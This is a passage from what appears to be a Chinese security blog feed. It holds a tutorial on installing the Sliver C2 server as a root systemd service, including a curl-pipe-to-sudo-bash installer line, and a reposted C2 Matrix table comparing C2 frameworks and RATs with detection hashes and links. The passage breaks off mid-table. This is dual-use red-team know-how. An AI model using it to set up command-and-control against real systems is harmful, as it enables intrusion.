    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近，对C2产生了一些兴趣，想尝试一些新的C2。 <a href="https://www.cobaltstrike.com/">Cobalt Strike</a> 暂时放一边。</p><p>搭建一个<a href="https://sliver.sh/">sliver</a>来玩玩。完全用 Go 构建，可以编译到所有平台，还有很多的 <a href="https://github.com/BishopFox/sliver#features">功能</a>。整体听起来很棒。来尝试研究搭建一下，尽量详细，使我能真正学到东西，并写到博客中。</p><p>当然，sliver也有官方使用<a href="https://sliver.sh/docs?name=Getting+Started">手册</a>，也可以参考学习。</p><h1 id="服务端的安装部署"><a href="#服务端的安装部署" class="headerlink" title="服务端的安装部署"></a>服务端的安装部署</h1><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">apt-get install build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64 //提前安装<br><br>curl https://sliver.sh/install|sudo bash //安装法1<br><br>sudo apt-get install sliver //安装法2<br><br>https://github.com/BishopFox/sliver/releases/download/v1.5.31/sliver-server_linux 然后将下载的 sliver_server_linux 把 /bin/sliver-server 和 /usr/bin/sliver-server 替换 //安装法3<br><br></code></pre></div></td></tr></table></figure><p><strong>建议使用<u>第三种</u>方法</strong></p><p>1、<a href="https://github.com/BishopFox/sliver/releases/tag/v1.5.42">https://github.com/BishopFox/sliver/releases/tag/v1.5.42</a> 发行版下载到kali中，然后放到&#x2F;use&#x2F;local&#x2F;bin中，<strong>重命名为 sliver-server</strong> </p><p>2、<strong>然后使用命令解压所有 sliver-server unpack –force</strong> </p><p>3、<strong>创建一个system服务 vim &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;sliver.service</strong>，填入以下内容</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">[Unit]<br>Description=Sliver<br>After=network.target<br>StartLimitIntervalSec=0<br><br>[Service]<br>Type=simple<br>Restart=on-failure<br>RestartSec=3<br>User=root<br>ExecStart=/usr/local/bin/sliver-server daemon<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></div></td></tr></table></figure><p>现在，可以使用<code>systemctl start sliver</code>启动服务器。如果成功启动，可以看到端口 31337 以及状态为active</p><p><img src="/2024/11/01/SliverC2-%E6%95%99%E7%A8%8B-1/image-20241101231525542.png" alt="image-20241101231525542"></p>]]></content>
    
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>已知C2（转载）</title>
    <link href="/2024/11/01/%E5%B7%B2%E7%9F%A5C2/"/>
    <url>/2024/11/01/%E5%B7%B2%E7%9F%A5C2/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th></th><th>C2 Info</th><th>C2 Matrix Info</th><th>Language</th><th>UI</th><th>Payload</th><th>Channel</th><th></th><th>Capabilities</th><th></th><th></th><th></th><th>Detection</th><th></th><th>Support</th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Name</td><td>License</td><td>Price</td><td>GitHub</td><td>Site</td><td>Twitter</td><td>Evaluator</td><td>Date</td><td>Version</td><td>Implementation</td><td>How-To</td><td>Slingshot</td><td>Kali</td><td>Server</td><td>Implant</td><td>Multi-User</td><td>UI</td><td>Dark Mode</td><td>API</td><td>Windows</td><td>Linux</td><td>macOS</td><td>Format</td><td>Packaging</td><td>TCP</td><td>HTTP</td><td>HTTP2</td><td>HTTP3</td><td>DNS</td><td>DoH</td><td>ICMP</td><td>FTP</td><td>IMAP</td><td>MAPI</td><td>SMB</td><td>LDAP</td><td>Key Exchange</td><td>Stego</td><td>Proxy Aware</td><td>DomainFront</td><td>Custom Profile</td><td>Jitter</td><td>Working Hours</td><td>Kill Date</td><td>Chaining</td><td>Logging</td><td>In Wild</td><td>ATT&amp;CK Mapping</td><td>Dashboard</td><td>SOCKS Support</td><td>VPN Pivoting</td><td>BOF</td><td>Blog</td><td><a href="https://github.com/nasbench/C2-Matrix-Indicators/">C2-Matrix Indicators</a></td><td><a href="https://howto.thec2matrix.com/detection/jarm">JARM</a></td><td><a href="https://michaelkoczwara.medium.com/hunting-c2-with-shodan-223ca250d06f">Shodan&#x2F;Censys</a></td><td>Actively Maint. &lt;12 mo</td><td>Slack</td><td>Slack Members</td><td>GH Issues</td><td>Notes</td></tr><tr><td>AirStrike</td><td>NA</td><td>NA</td><td><a href="https://github.com/smokeme/airstrike">https://github.com/smokeme/airstrike</a></td><td></td><td>@q8fawazo</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td>10&#x2F;2&#x2F;2022</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Alan</td><td>Created Commons</td><td>NA</td><td><a href="https://github.com/enkomio/AlanFramework">https://github.com/enkomio/AlanFramework</a></td><td></td><td>@s4tan</td><td>@s4tan</td><td>9&#x2F;10&#x2F;2021</td><td>4</td><td>binary</td><td></td><td></td><td></td><td>.NET</td><td>C&#x2F;Asm</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>No</td><td></td><td>All code is executed in memory</td></tr><tr><td>Alchimist</td><td>NA</td><td>NA</td><td></td><td><a href="https://blog.talosintelligence.com/2022/10/alchimist-offensive-framework.html">https://blog.talosintelligence.com/2022/10/alchimist-offensive-framework.html</a></td><td></td><td>@TalosSecurity</td><td>10&#x2F;13&#x2F;2022</td><td></td><td></td><td></td><td></td><td></td><td></td><td>Go</td><td>Yes</td><td>Web</td><td></td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Amnesiac</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/Leo4j/Amnesiac">https://github.com/Leo4j/Amnesiac</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Ares</td><td>NA</td><td>NA</td><td><a href="https://github.com/sweetsoftware/Ares">https://github.com/sweetsoftware/Ares</a></td><td></td><td></td><td>@nas_bench</td><td>5&#x2F;27&#x2F;2021</td><td>N&#x2F;A</td><td>Python</td><td></td><td></td><td></td><td>Python</td><td>Python</td><td>No</td><td>Web</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>None</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td></td><td>Yes</td><td></td><td></td><td></td><td><a href="https://github.com/nasbench/C2-Matrix-Indicators/tree/main/Ares">Yes</a></td><td><a href="https://github.com/nasbench/C2-Matrix-Indicators/tree/main/Ares">Yes</a></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td></td></tr><tr><td>AsyncRAT-C#</td><td>MIT</td><td>NA</td><td><a href="https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp">https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>1dd40d40d00040d1dc1dd40d1dd40d3df2d6a0c2caaa0dc59908f0d3602943</td><td><a href="https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=services.tls.certificates.leaf_data.issuer.common_name:AsyncRat">Yes</a></td><td>No</td><td></td><td>NA</td><td>158</td><td></td></tr><tr><td>AtlasC2</td><td>MIT</td><td>NA</td><td><a href="https://github.com/Gr1mmie/AtlasC2">https://github.com/Gr1mmie/AtlasC2</a></td><td><a href="https://grimmie.net/atlasc2-carrying-the-weight-of-net-assemblies/">https://grimmie.net/atlasc2-carrying-the-weight-of-net-assemblies/</a></td><td>@gr1mmie</td><td>@Adam_Mashinchi</td><td>3&#x2F;20&#x2F;2022</td><td></td><td>C#</td><td>Yes</td><td></td><td></td><td>C#</td><td>C#</td><td></td><td>CLI</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>BabyShark</td><td>NA</td><td>NA</td><td><a href="https://github.com/UnkL4b/BabyShark">https://github.com/UnkL4b/BabyShark</a></td><td></td><td>@UnkL4b</td><td>@nas_bench</td><td>6&#x2F;8&#x2F;2021</td><td>Beta 1.0</td><td></td><td></td><td></td><td></td><td>Python</td><td>Bash</td><td>No</td><td>Web</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>None</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td></td></tr><tr><td>Badrats</td><td>GNU GPL3</td><td>NA</td><td><a href="https://gitlab.com/KevinJClark/badrats">https://gitlab.com/KevinJClark/badrats</a></td><td></td><td>@GuhnooPlusLinux</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>BEAR</td><td>NA</td><td>NA</td><td><a href="https://github.com/S3N4T0R-0X0/BEAR">https://github.com/S3N4T0R-0X0/BEAR</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>BlackMamba</td><td>MIT</td><td>NA</td><td><a href="https://github.com/loseys/BlackMamba">https://github.com/loseys/BlackMamba</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td></td></tr><tr><td>Brute Ratel</td><td>Commercial</td><td>$2,500</td><td></td><td><a href="https://bruteratel.com/">https://bruteratel.com/</a></td><td>@NinjaParanoid</td><td>@NinjaParanoid</td><td>3&#x2F;19&#x2F;2021</td><td>0.3</td><td>binary</td><td></td><td></td><td></td><td>Golang</td><td>C, x64 Asm</td><td>Yes</td><td>GUI</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td><a href="https://www.shodan.io/search?query=http.html_hash:-1957161625">Yes</a></td><td>Yes</td><td></td><td></td><td></td><td></td></tr><tr><td>Bunraku</td><td>Apache 2</td><td>NA</td><td><a href="https://github.com/theshadowboxers/bunraku">https://github.com/theshadowboxers/bunraku</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>C3</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/FSecureLABS/C3">https://github.com/FSecureLABS/C3</a></td><td><a href="https://labs.f-secure.com/tools/c3/">https://labs.f-secure.com/tools/c3/</a></td><td>@FSecureLabs</td><td>@ajpc500</td><td>6&#x2F;30&#x2F;2021</td><td>1.3</td><td></td><td></td><td></td><td></td><td>.NET Core</td><td>C++</td><td>Yes</td><td>GUI</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td><a href="https://labs.f-secure.com/blog/introducing-ldap-c2-for-c3">Yes</a></td><td>Yes</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td></td><td></td><td></td><td>- hunting for C3 - <a href="https://labs.f-secure.com/blog/hunting-for-c3/">https://labs.f-secure.com/blog/hunting-for-c3/</a> - dropbox channel - <a href="https://labs.f-secure.com/blog/attack-detection-fundamentals-c2-and-exfiltration-lab-3">https://labs.f-secure.com/blog/attack-detection-fundamentals-c2-and-exfiltration-lab-3</a> - UNC share file detection - <a href="https://labs.f-secure.com/blog/attack-detection-fundamentals-discovery-and-lateral-movement-lab-3/">https://labs.f-secure.com/blog/attack-detection-fundamentals-discovery-and-lateral-movement-lab-3/</a> - Printer C2 detection - <a href="https://labs.f-secure.com/blog/print-c2/">https://labs.f-secure.com/blog/print-c2/</a> - Yara Rule from FireEye - <a href="https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html">https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html</a> - Yara rule for C3 in-memory shellcode - <a href="https://gist.github.com/ajpc500/9ae6eb427375438f906b0bf394813bc5">https://gist.github.com/ajpc500/9ae6eb427375438f906b0bf394813bc5</a> - C3 DLL usage (sigma rule) - <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/process_creation_c3_load_by_rundll32.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/process_creation_c3_load_by_rundll32.yml</a></td><td></td><td></td><td></td><td>Yes</td><td>#c3 bloodhoundgang.herokuapp.com</td><td>320</td><td>6</td><td>Asana - Dropbox - GoogleDrive - GitHub - Slack - O365 - LDAP - Printer - Unc Share File - MSSQL</td></tr><tr><td>CALDERA</td><td>Apache 2</td><td>NA</td><td><a href="https://github.com/mitre/caldera">https://github.com/mitre/caldera</a></td><td></td><td></td><td>@jorgeorchilles</td><td>10&#x2F;6&#x2F;2019</td><td>2</td><td>pip3</td><td>Yes</td><td></td><td></td><td>Python</td><td>Go</td><td>Yes</td><td>Web</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>None</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td>Yes</td><td><a href="http://mitre-caldera.slack.com/">http://mitre-caldera.slack.com/</a></td><td></td><td>181</td><td></td></tr><tr><td>Callidus</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/3xpl01tc0d3r/Callidus">https://github.com/3xpl01tc0d3r/Callidus</a></td><td></td><td>@chiragsavla94</td><td>@chiragsavla94</td><td>5&#x2F;8&#x2F;2020</td><td></td><td></td><td><a href="https://3xpl01tc0d3r.blogspot.com/2020/03/introduction-to-callidus.html">Yes</a></td><td></td><td></td><td>.Net Core</td><td>.Net Core</td><td>No</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>None</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td>O365 services: Outlook, OneNote, Teams</td></tr><tr><td>CHAOS</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/tiagorlampert/CHAOS">https://github.com/tiagorlampert/CHAOS</a></td><td></td><td>@tiagorlampert</td><td>@leekirkpatrick4</td><td>5&#x2F;14&#x2F;2020</td><td>3</td><td>Go</td><td></td><td>No</td><td></td><td>Go</td><td>Go</td><td>No</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td><a href="https://community.rsa.com/community/products/netwitness/blog/2020/05/14/using-rsa-netwitness-to-detect-chaos-c2">Yes</a></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>13</td><td></td></tr><tr><td>CloakNDaggerC2</td><td>GNU GPL2</td><td>NA</td><td><a href="https://github.com/matt-culbert/CloakNDaggerC2">https://github.com/matt-culbert/CloakNDaggerC2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Cobalt Strike</td><td>Commercial</td><td>$5,900</td><td></td><td><a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com/</a></td><td></td><td>@TimMedin</td><td>4&#x2F;29&#x2F;2023</td><td>4.8</td><td>binary</td><td></td><td></td><td></td><td>Java</td><td>C</td><td>Yes</td><td>GUI</td><td>Yes</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td></td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td>07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1</td><td>Yes</td><td>Yes</td><td>No</td><td>NA</td><td>NA</td><td></td></tr><tr><td>Core Impact</td><td>Commercial</td><td>$12,600</td><td></td><td><a href="https://www.coresecurity.com/products/core-impact/">https://www.coresecurity.com/products/core-impact/</a></td><td>@coreadvisories</td><td>@zurro</td><td>4&#x2F;28&#x2F;2023</td><td>21.3</td><td>binary</td><td></td><td></td><td></td><td>Python, C++</td><td>C&#x2F;Python</td><td>Yes</td><td>GUI</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>NA</td><td>NA</td><td>NA</td><td></td></tr><tr><td>Covenant</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/cobbr/Covenant">https://github.com/cobbr/Covenant</a></td><td><a href="https://cobbr.io/tags#covenant">https://cobbr.io/tags#covenant</a></td><td>@cobbr_io</td><td>@jorgeorchilles</td><td>10&#x2F;6&#x2F;2019</td><td>0.3</td><td>Docker</td><td>Yes</td><td>Yes</td><td>Yes</td><td>C#</td><td>C#</td><td>Yes</td><td>Web</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td></td><td>Encrypted Key Exchange</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td></td><td>Yes</td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td>[Yes](<a href="https://www.shodan.io/search?query=ssl:%E2%80%9DCovenant%E2%80%9D">https://www.shodan.io/search?query=ssl%3A”Covenant”</a> http.component%3A”Blazor”)</td><td>Yes</td><td>#covenant bloodhoundhq.slack.com</td><td>665</td><td>108</td><td></td></tr><tr><td>DaaC2</td><td>NA</td><td>NA</td><td><a href="https://github.com/crawl3r/DaaC2">https://github.com/crawl3r/DaaC2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Dali</td><td>MIT</td><td>NA</td><td><a href="https://github.com/h0mbre/Dali">https://github.com/h0mbre/Dali</a></td><td><a href="https://h0mbre.github.io/Image_Based_C2_PoC/">https://h0mbre.github.io/Image_Based_C2_PoC/</a></td><td>@h0mbre_</td><td>@jorgeorchilles</td><td>12&#x2F;24&#x2F;2019</td><td>POC</td><td>pip3</td><td></td><td></td><td></td><td>Python</td><td>Python</td><td>No</td><td>CLI</td><td></td><td>No</td><td>BYOI</td><td>BYOI</td><td>BYOI</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>AES</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>0</td><td>Uses Imgur</td></tr><tr><td>DarkFinger</td><td>MIT</td><td>NA</td><td><a href="https://github.com/hyp3rlinx/DarkFinger-C2">https://github.com/hyp3rlinx/DarkFinger-C2</a></td><td></td><td>@hyp3rlinx</td><td>@nas_bench</td><td>7&#x2F;4&#x2F;2021</td><td>POC</td><td>Python</td><td></td><td></td><td></td><td>Python</td><td>Batch</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td></td><td></td><td><a href="https://nasbench.medium.com/understanding-detecting-c2-frameworks-darkfinger-c2-539c79282a1c">Yes</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>DBC2</td><td>NA</td><td>NA</td><td><a href="https://github.com/Arno0x/DBC2">https://github.com/Arno0x/DBC2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td>Dropbox</td></tr><tr><td>DcRat</td><td>MIT</td><td>NA</td><td><a href="https://github.com/qwqdanchun/DcRat">https://github.com/qwqdanchun/DcRat</a></td><td></td><td>@qwqdanchun</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>DCVC2</td><td>NA</td><td>NA</td><td><a href="https://github.com/3NailsInfoSec/DCVC2">https://github.com/3NailsInfoSec/DCVC2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>DeimosC2</td><td>MIT</td><td>NA</td><td><a 